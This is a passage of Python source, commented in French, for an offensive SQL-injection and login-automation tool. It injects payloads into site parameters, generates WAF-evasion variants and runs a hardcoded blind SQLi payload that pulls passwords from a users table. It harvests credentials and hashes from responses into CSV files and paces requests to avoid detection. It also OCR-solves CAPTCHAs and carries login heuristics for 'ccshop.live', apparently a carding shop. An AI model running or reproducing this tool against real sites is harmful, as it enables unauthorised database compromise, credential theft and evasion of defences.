            # 1) Save text-only (HTML stripped)
            try:
                text_only = self._strip_html_to_text(text)
                p = out_dir / 'response_text_only.txt'
                with open(p, 'w', encoding='utf-8', errors='ignore') as f:
                    f.write(text_only)
                paths['text_only'] = str(p)
            except Exception:
                pass
            # 2) Save pre/code/textarea blocks concatenated
            blocks = []
            try:
                if BeautifulSoup is not None and text:
                    soup = BeautifulSoup(text, 'html.parser')
                    for tag in soup.find_all(['pre', 'code', 'textarea']):
                        content = tag.get_text('\n', strip=False)
                        if content and len(content.strip()) > 0:
                            blocks.append(content)
                    if blocks:
                        p2 = out_dir / 'response_blocks.txt'
                        with open(p2, 'w', encoding='utf-8', errors='ignore') as f:
                            f.write("\n\n==== BLOCK ====\n\n".join(blocks))
                        paths['blocks'] = str(p2)
            except Exception:
                pass
            # 3) Save structured extractions (heuristics)
            try:
                patterns = {
                    'mysql_version': r'mysql[^\n\r]*?(\d+\.\d+\.\d+)',
                    'postgres_version': r'postgresql[^\n\r]*?(\d+\.\d+)',
                    'database_name': r'database\(\)[^a-z0-9_]*([a-zA-Z][a-zA-Z0-9_]*)',
                    'user_info': r'user\(\)[^a-z0-9_@]*([a-zA-Z][a-zA-Z0-9_@]*)',
                    'table_name': r'\b([a-zA-Z][a-zA-Z0-9_]{2,})\b(?=.*?(columns|rows|table|from|into))',
                    'hashes': r'\b([a-fA-F0-9]{32}|\$2[aby]\$\d+\$[^\s]{20,})\b',
                    'credentials_like': r'([a-zA-Z0-9_.+-]{3,}@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+|[A-Za-z][A-Za-z0-9_]{2,}:[^\s]{3,})'
                }
                found = {}
                lower = text.lower() if text else ''
                for key, pat in patterns.items():
                    try:
                        matches = re.findall(pat, lower, re.IGNORECASE)
                        if matches:
                            # Normalize tuples/lists
                            flat = []
                            for m in matches:
                                if isinstance(m, (tuple, list)):
                                    flat.append(m[0])
                                else:
                                    flat.append(m)
                            found[key] = list(dict.fromkeys(flat))[:50]
                    except Exception:
                        continue
                # 3b) Attempt tabular extraction (HTML tables)
                extracted_pairs = []
                try:
                    if BeautifulSoup is not None and text:
                        soup2 = BeautifulSoup(text, 'html.parser')
                        for table in soup2.find_all('table'):
                            for tr in table.find_all('tr'):
                                cells = [td.get_text('\n', strip=True) for td in tr.find_all(['td','th'])]
                                cells = [c for c in cells if c is not None and c != '']
                                if len(cells) >= 2:
                                    # take first two as candidate username/password
                                    extracted_pairs.append((cells[0], cells[1]))
                except Exception:
                    pass
                # 3c) Fallback: line-based CSV/TSV/pipe splitting (only from blocks to reduce noise)
                try:
                    sources = blocks if blocks else []
                    lines = []
                    for src in sources:
                        lines.extend([l.strip() for l in src.splitlines() if l.strip()])
                    # Username and password validators
                    username_re = re.compile(r'^[A-Za-z0-9._-]{3,64}$')
                    email_re = re.compile(r'^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$')
                    hash_re = re.compile(r'^(?:[a-fA-F0-9]{32}|[a-fA-F0-9]{40}|[a-fA-F0-9]{64}|\$2[aby]\$\d+\$[^\s]{20,})$')
                    b64ish_re = re.compile(r'^[A-Za-z0-9+/=]{20,}$')
                    for l in lines:
                        # Skip long HTML-ish lines
                        if '<' in l and '>' in l and len(l) > 300:
                            continue
                        # Skip lines with HTML entities that likely are not data rows
                        if '&' in l and ';' in l:
                            continue
                        for sep in [',', ';', '|', ':', '\t']:
                            if sep in l:
                                parts = [p.strip() for p in l.split(sep)]
                                if len(parts) >= 2 and len(parts[0]) >= 2 and len(parts[1]) >= 1:
                                    u, p = parts[0], parts[1]
                                    is_user = bool(username_re.match(u) or email_re.match(u))
                                    is_pass = bool(hash_re.match(p) or b64ish_re.match(p))
                                    if is_user and is_pass:
                                        extracted_pairs.append((u, p))
                                break
                except Exception:
                    pass
                # Deduplicate and keep sane sizes
                if extracted_pairs:
                    normalized = []
                    seen = set()
                    for a, b in extracted_pairs:
                        key = (a, b)
                        if key not in seen and len(a) < 256 and len(b) < 1024:
                            seen.add(key)
                            normalized.append({'col1': a, 'col2': b})
                    # Only persist if we have enough validated rows
                    if normalized and len(normalized) >= 2:
                        # Save CSV specialized file when looks like username/password
                        try:
                            csvp = out_dir / 'users_extracted.csv'
                            with open(csvp, 'w', encoding='utf-8', errors='ignore') as f:
                                f.write('col1,col2\n')
                                for row in normalized:
                                    # naive CSV escaping
                                    c1 = row['col1'].replace('"', '""')
                                    c2 = row['col2'].replace('"', '""')
                                    f.write(f'"{c1}","{c2}"\n')
                            paths['users_csv'] = str(csvp)
                        except Exception:
                            pass
                        found['rows'] = normalized[:500]
                if found:
                    p3 = out_dir / 'extracted_data.json'
                    with open(p3, 'w', encoding='utf-8') as f:
                        json.dump(found, f, indent=2)
                    paths['extracted'] = str(p3)
            except Exception:
                pass
        except Exception:
            return paths
        return paths

    def _record_full_battle_log(self, response, url: str, method: str, payload: str, response_time_ms: float):
        try:
            ts = datetime.now().strftime('%Y%m%d_%H%M%S_%f')
            corr = f"{ts}_{uuid.uuid4().hex[:8]}"
            base_dir = Path('full_battle_logs') / corr
            self._ensure_dir(base_dir)
            # Write metadata
            meta = {
                'timestamp': ts,
                'correlation_id': corr,
                'request': {
                    'method': method,
                    'url': url,
                    'payload': payload
                },
                'response': {
                    'status_code': getattr(response, 'status_code', None),
                    'headers': dict(getattr(response, 'headers', {})) if getattr(response, 'headers', None) else {},
                    'content_length': len(getattr(response, 'content', b'') or b''),
                    'elapsed_ms': round(response_time_ms, 2)
                }
            }
            try:
                with open(base_dir / 'meta.json', 'w', encoding='utf-8') as f:
                    json.dump(meta, f, indent=2)
            except Exception:
                pass
            # Write body files
            paths = self._save_body_files(response, base_dir, 'response')
            # Save extraction-focused artifacts
            try:
                extracted_paths = self._save_extracted_artifacts(response, base_dir)
                paths.update(extracted_paths)
            except Exception:
                pass
            paths.update({'correlation_dir': str(base_dir)})
            return paths
        except Exception:
            return {'body_bin': '', 'body_txt': '', 'correlation_dir': ''}

    def _extract_login_form_data(self, form, inputs, username, password):
        """Construit les données du formulaire en conservant champs cachés (CSRF)."""
        action = form.get("action") or ""
        method = (form.get("method") or "post").lower()
        data = {}
        username_field = None
        password_field = None
        password_name_patterns = re.compile(r"pass|passwd|password|pwd", re.I)
        username_name_patterns = re.compile(r"username|user|login|email|mail|ident", re.I)
        for i in inputs:
            name = i.get("name")
            if not name:
                continue
            itype = (i.get("type") or "").lower()
            value = i.get("value") or ""
            if (itype == "password" or password_name_patterns.search(name)) and password_field is None:
                password_field = name
                data[name] = password
            elif (itype in ("text", "email", "username", "") or username_name_patterns.search(name)) and username_field is None:
                username_field = name
                data[name] = username
            else:
                data[name] = value
        # Tolère les sites avec champs custom (ex: login/email)
        return action, method, data

    def _extract_csrf_from_meta(self, soup):
        token = None
        header_name = None
        # Rails/Django/others
        meta_token = soup.find("meta", attrs={"name": re.compile(r"csrf", re.I)})
        if meta_token and meta_token.get("content"):
            token = meta_token.get("content")
            header_name = "X-CSRF-Token"
        # Laravel
        if not token:
            meta_token = soup.find("meta", attrs={"name": re.compile(r"_token|csrf-token", re.I)})
            if meta_token and meta_token.get("content"):
                token = meta_token.get("content")
                header_name = "X-CSRF-TOKEN"
        return token, header_name

    def _discover_login_urls(self, base_url, soup):
        candidates = [
            "/login.php", "/login", "/signin", "/sign-in", "/account/login", "/user/login", "/users/sign_in",
            "/auth/login", "/session", "/sessions/new", "/wp-login.php", "/admin/login"
        ]
        discovered = []
        # Cherche des liens pertinents dans la page
        try:
            for a in soup.find_all("a"):
                href = a.get("href") or ""
                text = (a.get_text() or "").lower()
                if any(t in text for t in ["login", "sign in", "connexion", "se connecter", "auth"]):
                    if href and not href.startswith("javascript"):
                        discovered.append(urljoin(base_url, href))
        except Exception:
            pass
        # Complète avec chemins standards
        discovered.extend([urljoin(base_url, c) for c in candidates])
        # Uniques en conservant l'ordre
        seen = set()
        uniq = []
        for u in discovered:
            if u not in seen:
                seen.add(u)
                uniq.append(u)
        return uniq

    def _solve_captcha(self, image_bytes):
        """Tentative OCR via pytesseract. Nettoie pour ne garder que des chiffres."""
        if Image is None or pytesseract is None:
            return None
        try:
            img = Image.open(BytesIO(image_bytes))
            # Options OCR: digits only
            config = "--psm 7 -c tessedit_char_whitelist=0123456789"
            text = pytesseract.image_to_string(img, config=config) or ""
            digits = re.sub(r"\D", "", text)
            return digits if digits else None
        except Exception:
            return None

    def _fetch_and_solve_captcha(self, captcha_url, referer=None):
        try:
            # Cache-busting param to avoid stale images
            cache_buster = str(int(time.time() * 1000))
            url_cb = captcha_url + ("&" if "?" in captcha_url else "?") + "_=" + cache_buster
            headers = {"Referer": referer, "Accept": "image/avif,image/webp,image/png,image/*;q=0.8"} if referer else {"Accept": "image/avif,image/webp,image/png,image/*;q=0.8"}
            r = self.session.get(url_cb, timeout=15, headers=headers, verify=self.verify)
            r.raise_for_status()
            content_type = (r.headers.get('Content-Type') or '').lower()
            if not content_type.startswith('image') or not r.content or len(r.content) < 20:
                # Retry once with a fresh cache buster
                cache_buster = str(int(time.time() * 1000) + 1)
                url_cb = captcha_url + ("&" if "?" in captcha_url else "?") + "_=" + cache_buster
                r = self.session.get(url_cb, timeout=15, headers=headers, verify=self.verify)
                r.raise_for_status()
            solved = self._solve_captcha(r.content)
            if not solved:
                print(f"{Colors.YELLOW}ℹ️ OCR n'a pas réussi. Entrée manuelle requise.{Colors.END}")
                return None, r.content
            print(f"{Colors.CYAN}🤖 CAPTCHA résolu (OCR): {solved}{Colors.END}")
            return solved, r.content
        except Exception as e:
            print(f"{Colors.RED}❌ Erreur récupération CAPTCHA: {e}{Colors.END}")
            return None, None

    def login_to_site(self, base_url, username, password, timeout=20, login_url_override=None, form_selector_override=None, captcha_url_override=None, force_manual_captcha=False):
        """Tente de se connecter en détectant un formulaire de login sur la page cible."""
        if BeautifulSoup is None:
            print(f"{Colors.YELLOW}ℹ️ BeautifulSoup non installé. Skipping login detection. (pip install beautifulsoup4){Colors.END}")
            return False, None
        try:
            resp = self.session.get(base_url, timeout=timeout, allow_redirects=True, verify=self.verify)
            resp.raise_for_status()
            soup = BeautifulSoup(resp.text, "html.parser")
            # Heuristiques spécifiques pour domaines connus
            try:
                host = urlparse(resp.url).netloc.lower()
            except Exception:
                host = ''
            if 'ccshop.live' in host:
                if not login_url_override:
                    login_url_override = '/login.php'
                if not form_selector_override:
                    form_selector_override = 'form.form-login'
                if not captcha_url_override:
                    captcha_url_override = 'captcha/captcha.php'
            # Liste des URLs à tester
            search_urls = []
            if login_url_override:
                search_urls.append(urljoin(resp.url, login_url_override))
            search_urls.extend([resp.url])
            search_urls += self._discover_login_urls(resp.url, soup)
            form = None
            inputs = None
            login_page_url = None
            # Essaie séquentiellement des URLs probables de login
            for test_url in search_urls[:10]:
                r = self.session.get(test_url, timeout=timeout, allow_redirects=True, verify=self.verify)
                if r.status_code >= 400:
                    continue
                s = BeautifulSoup(r.text, "html.parser")
                f, ins = self._find_login_form(s, selector_override=form_selector_override)
                if f:
                    form, inputs, soup, login_page_url = f, ins, s, r.url
                    break
            if not form:
                print(f"{Colors.YELLOW}ℹ️ Formulaire de login introuvable sur les pages testées.{Colors.END}")
                print(f"{Colors.YELLOW}Astuce:{Colors.END} Fournissez l'URL directe de login si connue.")
                return False, resp
            action, method, data = self._extract_login_form_data(form, inputs, username, password)
            # CSRF meta -> header
            csrf_token, csrf_header = self._extract_csrf_from_meta(soup)
            temp_headers = {}
            if csrf_token and csrf_header:
                temp_headers[csrf_header] = csrf_token
            # Détecte un champ captcha et autres champs utiles (submit/remember)
            captcha_field = None
            submit_field = None
            submit_value = None
            remember_field = None
            for i in inputs:
                n = (i.get("name") or "")
                if re.search(r"captcha|code|verification", n, re.I):
                    captcha_field = n
                itype = (i.get("type") or "").lower()
                if itype == "submit" or n.lower() == "submit":
                    submit_field = n or "submit"
                    submit_value = i.get("value") or "Login"
                if itype == "checkbox" and (n.lower() == "remember" or re.search(r"remember|keep", n, re.I)):
                    remember_field = n
            solved_captcha = None
            if captcha_field or captcha_url_override:
                # URL captcha: depuis override, attribut src d'une img, ou valeur donnée
                captcha_url = None
                if captcha_url_override:
                    captcha_url = urljoin(login_page_url or base_url, captcha_url_override)
                else:
                    img = soup.find("img", attrs={"src": re.compile(r"captcha", re.I)})
                    if img and img.get("src"):
                        captcha_url = urljoin(login_page_url or base_url, img.get("src"))
                if captcha_url:
                    if force_manual_captcha:
                        try:
                            headers = {"Referer": login_page_url or base_url}
                            # Cache-busting for manual save too
                            url_cb = captcha_url + ("&" if "?" in captcha_url else "?") + "_=" + str(int(time.time()*1000))
                            rimg = self.session.get(url_cb, timeout=15, headers=headers, verify=self.verify)
                            rimg.raise_for_status()
                            ts = datetime.now().strftime('%Y%m%d_%H%M%S')
                            ct = (rimg.headers.get('Content-Type') or '').lower()
                            ext = '.png'
                            if 'jpeg' in ct or 'jpg' in ct:
                                ext = '.jpg'
                            elif 'gif' in ct:
                                ext = '.gif'
                            fname = f"captcha_{ts}{ext}"
                            with open(fname, 'wb') as f:
                                f.write(rimg.content)
                            print(f"{Colors.CYAN}🖼️ CAPTCHA enregistré dans le fichier: {fname}{Colors.END}")
                            # Ouvrir l'image
                            try:
                                if sys.platform.startswith('win'):
                                    os.startfile(fname)
                                elif sys.platform == 'darwin':
                                    subprocess.Popen(['open', fname])
                                else:
                                    subprocess.Popen(['xdg-open', fname])
                            except Exception:
                                pass
                        except Exception as e:
                            print(f"{Colors.YELLOW}ℹ️ Impossible d'enregistrer l'image CAPTCHA: {e}{Colors.END}")
                    else:
                        solved_captcha, raw = self._fetch_and_solve_captcha(captcha_url, referer=login_page_url or base_url)
                if force_manual_captcha or not solved_captcha:
                    # Affiche une invite pour entrée manuelle
                    try:
                        print(f"{Colors.YELLOW}🔐 Entrez la valeur du CAPTCHA affiché sur le site.{Colors.END}")
                        manual = input(f"{Colors.BOLD}CAPTCHA: {Colors.END}").strip()
                        if manual:
                            solved_captcha = manual
                            # Supprime l'image enregistrée si présente
                            try:
                                if 'fname' in locals() and fname and os.path.exists(fname):
                                    os.remove(fname)
                            except Exception:
                                pass
                    except KeyboardInterrupt:
                        solved_captcha = None
                if solved_captcha and captcha_field:
                    data[captcha_field] = solved_captcha
            # Ajouter submit/remember si attendus
            if submit_field:
                data[submit_field] = submit_value or "Login"
            if remember_field and remember_field not in data:
                data[remember_field] = "on"
            # Déterminer l'URL de POST (si action vide, poster sur la page de login)
            if not action or action.strip() == "":
                post_url = login_page_url or base_url
            else:
                post_url = urljoin(login_page_url or base_url, action)
            common_headers = {"Referer": login_page_url or base_url}
            if temp_headers:
                common_headers.update(temp_headers)
            if method == "post":
                login_resp = self.session.post(post_url, data=data, headers=common_headers, timeout=timeout, allow_redirects=True, verify=self.verify)
            else:
                login_resp = self.session.get(post_url, params=data, headers=common_headers, timeout=timeout, allow_redirects=True, verify=self.verify)
            login_resp.raise_for_status()
            text_l = login_resp.text.lower()
            # Heuristiques de succès: présence de logout/déconnexion, disparition du champ password
            success_indicators = ["logout", "déconnexion", "sign out", "my account", "profile"]
            success = any(tok in text_l for tok in success_indicators)
            if not success:
                # Vérifie si le formulaire mot de passe n'est plus présent
                try:
                    page_soup = BeautifulSoup(login_resp.text, "html.parser")
                    pw_again = page_soup.find("input", {"type": lambda v: v and v.lower()=="password"})
                    # Considérer redirection vers index/dashboard comme succès
                    redirected = urlparse(login_resp.url).path.lower() not in (urlparse(base_url).path.lower(), '/login.php', '/login')
                    success = pw_again is None or redirected
                except Exception:
                    pass
            self.logged_in = bool(success)
            if self.logged_in:
                print(f"{Colors.GREEN}✅ Login réussi sur {login_resp.url}{Colors.END}")
            else:
                print(f"{Colors.RED}❌ Login échoué. Continuer sans authentification.{Colors.END}")
            return self.logged_in, login_resp
        except requests.RequestException as e:
            print(f"{Colors.RED}❌ Erreur de connexion: {e}{Colors.END}")
            return False, None

    def advanced_payload_test(self, url, payload, attack_type, is_time_based=False, include_response_text=False):
        """Test de payload avec détection avancée"""
        try:
            parsed = urlparse(url)
            
            # Multi-point injection
            injection_points = []
            
            if parsed.query:
                params = urllib.parse.parse_qs(parsed.query)
                for param in params.keys():
                    test_params = params.copy()
                    test_params[param] = [payload]
                    query_string = urllib.parse.urlencode(test_params, doseq=True)
                    injection_points.append(f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}")
            
            # Default injection points
            if not injection_points:
                base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                injection_points = [
                    f"{base_url}?id={urllib.parse.quote(payload)}",
                    f"{base_url}?user={urllib.parse.quote(payload)}",
                    f"{base_url}?search={urllib.parse.quote(payload)}",
                    f"{base_url}?category={urllib.parse.quote(payload)}"
                ]
            
            results = []
            
            for test_url in injection_points[:2]:  # Limite à 2 pour éviter le spam
                start_time = time.time()
                
                # Essai GET et POST
                for method in ['GET', 'POST']:
                    try:
                        if method == 'POST':
                            post_data = {
                                'id': payload, 'search': payload, 'q': payload, 
                                'username': payload, 'password': payload,
                                'email': payload, 'data': payload
                            }
                            response = self._send_with_resilience('POST', url, data=post_data)
                        else:
                            response = self._send_with_resilience('GET', test_url)
                        
                        response_time = (time.time() - start_time) * 1000
                        
                        # Indicateurs de vulnérabilité ultra-avancés
                        critical_indicators = [
                            # Erreurs SQL critiques
                            'you have an error in your sql syntax', 'warning: mysql', 'postgresql error',
                            'oracle error', 'microsoft odbc', 'sqlite error', 'syntax error near',
                            'conversion failed', 'invalid column name', 'operand type clash',
                            'cannot convert', 'database error', 'sql server error', 'ora-00933',
                            'msg 156', 'msg 102', 'pg_query failed', 'mysql_fetch_array',
                            
                            # Indicateurs spécifiques CVE
                            'zabbix database error', 'centreon sql', 'grafana database',
                            'multibyte character', 'invalid utf-8', 'character encoding',
                            
                            # Indicateurs RCE
                            'command not found', 'permission denied', 'no such file',
                            '/bin/sh', '/usr/bin', 'www-data', 'apache', 'nginx',
                            'root:x:', 'uid=', 'gid=', 'groups=',
                            
                            # Data exfiltration indicators
                            'admin:$', 'user:$', 'password_hash', 'md5:', 'sha1:',
                            'database_name', 'table_name', 'column_name',
                            
                            # Time-based success indicators  
                            'benchmark completed', 'sleep completed', 'waitfor completed',
                            'pg_sleep', 'delayed execution'
                        ]
                        
                        response_text = response.text.lower()
                        
                        # Détection d'erreurs SQL
                        has_sql_errors = any(indicator in response_text for indicator in critical_indicators)
                        
                        # Détection time-based sophistiquée
                        is_delayed = False
                        if is_time_based or 'SLEEP' in payload.upper() or 'WAITFOR' in payload.upper():
                            expected_delay = 5000
                            tolerance = 800
                            is_delayed = response_time > (expected_delay - tolerance)
                        
                        # Détection de status codes critiques
                        critical_status = response.status_code in [500, 502, 503, 504]
                        
                        # Détection de changements dans la response
                        response_anomalies = (
                            len(response.text) > 50000 or  # Response anormalement longue
                            len(response.text) < 10 or     # Response anormalement courte
                            'stack trace' in response_text or
                            'fatal error' in response_text or
                            'exception' in response_text
                        )
                        
                        vulnerability_score = sum([
                            has_sql_errors * 5,
                            is_delayed * 4,
                            critical_status * 3,
                            response_anomalies * 2
                        ])
                        
                        is_vulnerable = vulnerability_score >= 3
                        
                        # Enregistrement Full Battle Log
                        fbl_paths = self._record_full_battle_log(response, test_url if method=='GET' else url, method, payload, response_time)

                        result = {
                            'payload': payload,
                            'url': test_url,
                            'method': method,
                            'status_code': response.status_code,
                            'response_time': round(response_time, 2),
                            'content_length': len(response.text),
                            'vulnerable': is_vulnerable,
                            'vulnerability_score': vulnerability_score,
                            'has_sql_errors': has_sql_errors,
                            'is_delayed': is_delayed,
                            'critical_status': critical_status,
                            'response_anomalies': response_anomalies,
                            'full_battle_log': fbl_paths
                        }
                        if include_response_text:
                            result['response_text'] = response.text
                        
                        results.append(result)
                        
                        if is_vulnerable:
                            break  # Arrêter si vulnérabilité détectée
                        
                    except requests.RequestException as e:
                        # Même en cas d'erreur, loguer le corps si possible
                        resp = getattr(e, 'response', None)
                        response_time = (time.time() - start_time) * 1000
                        fbl_paths = {}
                        if resp is not None:
                            try:
                                fbl_paths = self._record_full_battle_log(resp, test_url if method=='GET' else url, method, payload, response_time)
                            except Exception:
                                fbl_paths = {}
                        results.append({
                            'payload': payload,
                            'url': test_url,
                            'method': method,
                            'error': str(e),
                            'vulnerable': False,
                            'full_battle_log': fbl_paths or {}
                        })
                        continue
            
            # Retourner le meilleur résultat
            if results:
                best_result = max(results, key=lambda x: x.get('vulnerability_score', 0))
                return best_result
            else:
                return {'payload': payload, 'url': url, 'vulnerable': False, 'error': 'No results'}
                
        except Exception as e:
            return {'payload': payload, 'url': url, 'error': str(e), 'vulnerable': False}

    def generate_ml_enhanced_variations(self, base_payloads):
        """Génère des variations avec techniques ML d'évasion"""
        variations = []
        
        # Techniques d'évasion avancées
        evasion_techniques = [
            # Encodage multiple
            lambda x: x.replace("'", "%2527").replace("--", "%252D%252D"),  # Double URL encoding
            lambda x: ''.join(f'%{ord(c):02x}' for c in x),  # Full URL encoding
            lambda x: base64.b64encode(x.encode()).decode(),  # Base64
            
            # Fragmentation
            lambda x: x.replace('UNION', 'UNI/**/ON').replace('SELECT', 'SEL/**/ECT'),
            lambda x: x.replace(' ', '/**/').replace('=', '/**/=/**/'),
            
            # Case variation sophistiquée  
            lambda x: ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(x)),
            lambda x: ''.join(c.upper() if hash(c) % 2 == 0 else c.lower() for c in x),
            
            # Injection de caractères invisibles
            lambda x: x.replace(' ', '\u2000'),  # En quad space
            lambda x: x.replace(' ', '\u200B'),  # Zero-width space
            lambda x: x.replace('\'', '\u0027'),  # Unicode apostrophe
            
            # Techniques WAF bypass
            lambda x: x.replace('AND', '/*!00000AND*/').replace('OR', '/*!00000OR*/'),
            lambda x: x.replace('=', ' LIKE ').replace('!=', ' NOT LIKE '),
            lambda x: x.replace('UNION', '{fn UNION()}').replace('SELECT', '{fn SELECT()}'),
        ]
        
        for payload in base_payloads:
            variations.append(payload)  # Original
            
            # Application des techniques d'évasion
            for technique in evasion_techniques:
                try:
                    mutated = technique(payload)
                    if mutated != payload and len(mutated) < 500:
                        variations.append(mutated)
                except:
                    continue
            
            # Variations spéciales pour time-based
            if 'SLEEP' in payload.upper() or 'WAITFOR' in payload.upper():
                time_variations = [
                    payload.replace('5', str(random.randint(3, 8))),
                    payload.replace('SLEEP(5)', f'BENCHMARK({random.randint(3000000, 7000000)},MD5(1))'),
                    payload.replace('WAITFOR DELAY', f'WAITFOR DELAY \'0:0:{random.randint(3, 7)}\'')
                ]
                variations.extend([v for v in time_variations if v != payload])
        
        # Payloads ML-enhanced supplémentaires
        ml_enhanced = [
            "'; DECLARE @i INT; SET @i=0; WHILE @i<5000000 BEGIN SET @i=@i+1; END; IF (ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1)))>96 WAITFOR DELAY '0:0:5';--",
            "' OR (SELECT * FROM (SELECT(BENCHMARK(5000000,MD5(CONCAT((SELECT password FROM users LIMIT 1),RAND())))))x)--",
            "'; WITH RECURSIVE bomb(x) AS (VALUES(1) UNION ALL SELECT x+1 FROM bomb WHERE x<10000) SELECT CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN pg_sleep(5) ELSE COUNT(*) END FROM bomb;--"
        ]
        variations.extend(ml_enhanced)
        
        # Suppression des doublons
        return list(dict.fromkeys(variations))

    def execute_standard_strike(self, attack_choice, target_url):
        """Exécute une attaque standard avec payloads CVE"""
        attack = self.attack_arsenal[attack_choice]
        
        print(f"\n{Colors.BOLD}{Colors.RED}💀 LANCEMENT DE L'ATTAQUE CVE 💀{Colors.END}")
        print(f"Arme sélectionnée: {Colors.CYAN}{attack['name']}{Colors.END}")
        print(f"CVSS Score: {Colors.RED}{Colors.BOLD}{attack['cvss']}{Colors.END}")
        print(f"Cible: {Colors.UNDERLINE}{target_url}{Colors.END}")
        print(f"Munitions: {len(attack['payloads'])} payloads critiques")
        print("-" * 80)
        
        results = []
        critical_hits = 0
        is_time_based = 'Time-Based' in attack['name'] or 'Blind' in attack['name']
        
        for i, payload in enumerate(attack['payloads'], 1):
            print(f"\n{Colors.YELLOW}[{i}/{len(attack['payloads'])}] 🎯 Firing: {Colors.CYAN}{payload[:80]}{'...' if len(payload) > 80 else ''}{Colors.END}")
            
            result = self.advanced_payload_test(target_url, payload, attack['name'], is_time_based)
            results.append(result)
            
            if 'error' in result and result['error']:
                print(f"  {Colors.RED}💥 Connection Error: {result['error']}{Colors.END}")
            else:
                vuln_score = result.get('vulnerability_score', 0)
                
                if result.get('vulnerable', False):
                    critical_hits += 1
                    print(f"  {Colors.BG_RED}{Colors.WHITE}{Colors.BOLD} 💀 CRITICAL HIT #{critical_hits} 💀 {Colors.END}")
                    print(f"    Status: {result['status_code']} | Time: {result['response_time']}ms")
                    print(f"    Vuln Score: {Colors.RED}{vuln_score}/15{Colors.END}")
                    
                    if result.get('has_sql_errors'):
                        print(f"    {Colors.RED}├─ SQL Errors Detected{Colors.END}")
                    if result.get('is_delayed'):
                        print(f"    {Colors.RED}├─ Time-based Success{Colors.END}")
                    if result.get('critical_status'):
                        print(f"    {Colors.RED}├─ Critical HTTP Status{Colors.END}")
                    if result.get('response_anomalies'):
                        print(f"    {Colors.RED}└─ Response Anomalies{Colors.END}")
                else:
                    status_color = Colors.YELLOW if vuln_score > 0 else Colors.GREEN
                    print(f"  {status_color}Target Resisted{Colors.END} | Score: {vuln_score}/15 | Time: {result['response_time']}ms")
            
            # Délai anti-détection
            time.sleep(0.5)
        
        self.display_battle_summary(attack, target_url, results, critical_hits)
        return results

    def execute_annihilation_mode(self, attack_choice, target_url):
        """Mode d'annihilation avec variations ultra-avancées"""
        attack = self.attack_arsenal[attack_choice]
        
        print(f"\n{Colors.BG_RED}{Colors.WHITE}{Colors.BOLD} ⚡ RED TEAM ANNIHILATION MODE ACTIVATED ⚡ {Colors.END}")
        print(f"Target: {Colors.UNDERLINE}{target_url}{Colors.END}")
        print(f"Base Arsenal: {len(attack['payloads'])} CVE payloads")
        
        # Génération de variations
        variations = self.generate_ml_enhanced_variations(attack['payloads'])
        total_arsenal = len(variations)
        
        print(f"Enhanced Arsenal: {Colors.BOLD}{Colors.RED}{total_arsenal}{Colors.END} variations létales")
        print(f"Estimated Duration: {Colors.YELLOW}~{total_arsenal * 1.2:.0f} seconds{Colors.END}")
        
        confirm = input(f"\n{Colors.BOLD}🚨 This will unleash {total_arsenal} attacks. Engage? (y/n): {Colors.END}").strip().lower()
        if confirm != 'y':
            print(f"{Colors.YELLOW}💤 Mission aborted.{Colors.END}")
            return []
        
        print(f"\n{Colors.RED}💀💀💀 UNLEASHING DIGITAL HELL 💀💀💀{Colors.END}")
        print("-" * 100)
        
        results = []
        critical_hits = 0
        is_time_based = 'Time-Based' in attack['name'] or 'Blind' in attack['name']
        
        for i, payload in enumerate(variations, 1):
            if i % 50 == 0:
                print(f"\n{Colors.CYAN}🌪️ Devastation Progress: {i}/{total_arsenal} ({(i/total_arsenal)*100:.1f}%) | Critical Hits: {critical_hits}{Colors.END}")
            
            result = self.advanced_payload_test(target_url, payload, attack['name'], is_time_based)
            results.append(result)
            
            if result.get('vulnerable', False):
                critical_hits += 1
                print(f"\n{Colors.BG_RED}{Colors.WHITE}{Colors.BLINK} 💀 DEVASTATING HIT #{critical_hits} 💀 {Colors.END}")
                print(f"  Payload: {Colors.RED}{payload[:100]}{'...' if len(payload) > 100 else ''}{Colors.END}")
                print(f"  Impact: {result['vulnerability_score']}/15 | Response: {result['response_time']}ms")
                
                if result.get('has_sql_errors'):
                    print(f"  {Colors.RED}💥 Database Compromise Detected{Colors.END}")
                if result.get('is_delayed'):
                    print(f"  {Colors.RED}⏰ Time-based Extraction Success{Colors.END}")
            elif i % 20 == 0:
                print("💥", end="", flush=True)
            
            # Délai intelligent anti-détection
            time.sleep(0.2 + random.uniform(0, 0.3))
        
        print(f"\n\n{Colors.BOLD}{Colors.RED}🏁 ANNIHILATION COMPLETE 🏁{Colors.END}")
        self.display_battle_summary(attack, target_url, results, critical_hits)
        return results

    def execute_ml_evasion_mode(self, attack_choice, target_url):
        """Mode avec évasion IA et techniques adaptatives"""
        attack = self.attack_arsenal[attack_choice]
        
        print(f"\n{Colors.PURPLE}{Colors.BOLD}🤖 ML-ENHANCED EVASION MODE 🤖{Colors.END}")
        print(f"Target Analysis: {target_url}")
        print(f"Deploying AI-powered evasion techniques...")
        
        # Simulation d'analyse IA
        print(f"{Colors.CYAN}🧠 Analyzing target defense patterns...{Colors.END}")
        time.sleep(2)
        print(f"{Colors.CYAN}🧠 Generating adaptive payloads...{Colors.END}")
        time.sleep(1)
        
        # Variations ML: configurable/aleatoire par payload et dédoublonnées
        try:
            per_payload_input = input(f"{Colors.BOLD}Variations par payload (vide=aléatoire 5-20): {Colors.END}").strip()
            per_payload = int(per_payload_input) if per_payload_input else 0
        except Exception:
            per_payload = 0
        if per_payload <= 0:
            per_payload = random.randint(5, 20)

        variations_set = set()
        for payload in attack['payloads']:
            variations_set.add(payload)
            for _ in range(per_payload):
                mutated = self.ai_mutate_payload(payload)
                if mutated:
                    variations_set.add(mutated)
        ml_variations = list(variations_set)
        random.shuffle(ml_variations)
        total_payloads = len(ml_variations)
        print(f"🤖 Generated {Colors.BOLD}{total_payloads}{Colors.END} AI-enhanced payloads")
        
        confirm = input(f"\n{Colors.BOLD}Deploy AI arsenal? (y/n): {Colors.END}").strip().lower()
        if confirm != 'y':
            return []
        
        results = []
        ai_hits = 0
        
        for i, payload in enumerate(ml_variations, 1):
            if i % 25 == 0:
                print(f"\n{Colors.PURPLE}🤖 AI Progress: {i}/{total_payloads} | Successful Adaptations: {ai_hits}{Colors.END}")
            
            result = self.advanced_payload_test(target_url, payload, attack['name'], True)
